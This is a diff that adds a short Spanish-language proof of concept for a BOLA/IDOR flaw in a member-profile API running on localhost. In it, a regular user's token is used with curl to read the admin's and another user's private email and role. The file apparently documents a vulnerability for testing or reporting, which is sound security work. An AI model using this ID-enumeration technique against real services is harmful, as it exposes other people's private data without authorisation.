@@ -1,0 +1,33 @@
+################################################################
+# PoC API1:2023 - BOLA / IDOR
+# Endpoint: GET /api/members/:id   |   Estado: VULNERABLE
+################################################################
+
+## Contexto: 'victima' (id=13) solo deberia ver su propio perfil.
+
+## Paso 1. Accede al perfil privado del ADMIN (id=1) cambiando la URL
+$ curl 'http://localhost:3000/api/members/1' -H 'Authorization: Token <token-de-victima>'
+{
+    "member": {
+        "id": 1,
+        "email": "francisco-javier+wafula336@qq.dev",
+        "username": "Eliyahu Jim\u00e9nez",
+        "role": "admin",
+        "bio": null
+    }
+}
+
+## Paso 2. Accede al perfil de otro usuario cualquiera (id=5)
+$ curl 'http://localhost:3000/api/members/5' -H 'Authorization: Token <token-de-victima>'
+{
+    "member": {
+        "id": 5,
+        "email": "elisabeth_barasa325@gmx.info",
+        "username": "Johannes \u017dukauskien\u0117",
+        "role": "user",
+        "bio": null
+    }
+}
+
+## Resultado: enumeracion horizontal de datos privados (correo, rol)
+## de todos los usuarios. No se valida la propiedad del recurso.
